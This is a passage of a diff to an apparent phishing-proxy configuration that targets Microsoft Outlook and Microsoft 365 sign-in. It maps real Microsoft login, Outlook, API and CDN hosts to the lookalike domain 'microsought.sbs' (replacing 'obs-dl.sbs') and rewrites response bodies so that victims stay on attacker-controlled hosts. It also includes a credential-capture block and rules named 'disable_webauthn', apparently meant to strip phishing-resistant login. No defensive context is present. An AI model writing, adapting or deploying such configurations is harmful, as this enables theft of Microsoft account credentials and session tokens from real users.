+      replace: "outlook-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_windows_in_outlook_office"
       find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
+      replace: "login-windows.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_res_cdn_in_outlook_office"
       find: "res\\.cdn\\.office\\.net"
-      replace: "res-cdn.obs-dl.sbs"
+      replace: "res-cdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_ecs_in_outlook_office"
       find: "ecs\\.office\\.com"
-      replace: "ecs.obs-dl.sbs"
+      replace: "ecs.microsought.sbs"
       from: "response_body"
 
     - name: "disable_webauthn_outlook_office"
@@ -1060,7 +1083,7 @@ outlook.office.com:
 # outlook.live.com - Consumer OWA (outlook.com accounts)
 # ============================================================
 outlook.live.com:
-  to: "outlook-live.obs-dl.sbs"
+  to: "outlook-live.microsought.sbs"
   capture:
     - name: "consumer_client_id"
       method: "GET"
@@ -1113,82 +1136,82 @@ outlook.live.com:
   rewrite:
     - name: "rewrite_outlook_live_domain"
       find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
+      replace: "outlook-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_outlook_live"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_outlook_live"
       find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
+      replace: "live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_outlook_live"
       find: "login\\.microsoft\\.com"
-      replace: "loginmicrosoft.obs-dl.sbs"
+      replace: "loginmicrosoft.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_outlook_live"
       find: "www\\.office\\.com"
-      replace: "office.obs-dl.sbs"
+      replace: "office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_m365_in_outlook_live"
       find: "m365\\.cloud\\.microsoft"
-      replace: "m365.obs-dl.sbs"
+      replace: "m365.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_aadcdn_in_outlook_live"
       find: "aadcdn\\.msftauth\\.net"
-      replace: "aadcdn.obs-dl.sbs"
+      replace: "aadcdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_logincdn_in_outlook_live"
       find: "logincdn\\.msftauth\\.net"
-      replace: "logincdn.obs-dl.sbs"
+      replace: "logincdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_msauth_in_outlook_live"
       find: "aadcdn\\.msauth\\.net"
-      replace: "msauth.obs-dl.sbs"
+      replace: "msauth.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_account_live_in_outlook_live"
       find: "account\\.live\\.com"
-      replace: "account-live.obs-dl.sbs"
+      replace: "account-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook365_in_outlook_live"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_outlook_live"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_substrate_in_outlook_live"
       find: "substrate\\.office\\.com"
-      replace: "substrate.obs-dl.sbs"
+      replace: "substrate.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_windows_in_outlook_live"
       find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
+      replace: "login-windows.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_res_cdn_in_outlook_live"
       find: "res\\.cdn\\.office\\.net"
-      replace: "res-cdn.obs-dl.sbs"
+      replace: "res-cdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_ecs_in_outlook_live"
       find: "ecs\\.office\\.com"
-      replace: "ecs.obs-dl.sbs"
+      replace: "ecs.microsought.sbs"
       from: "response_body"
 
     - name: "disable_webauthn_outlook_live"
@@ -1202,29 +1225,29 @@ outlook.live.com:
 # substrate.office.com - Outlook API backend
 # ============================================================
 substrate.office.com:
-  to: "substrate.obs-dl.sbs"
+  to: "substrate.microsought.sbs"
   rewrite:
     - name: "rewrite_substrate_domain"
       find: "substrate\\.office\\.com"
-      replace: "substrate.obs-dl.sbs"
+      replace: "substrate.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook365_in_substrate"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_substrate"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_substrate"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_substrate"
       find: "www\\.office\\.com"
-      replace: "office.obs-dl.sbs"
+      replace: "office.microsought.sbs"
       from: "response_body"
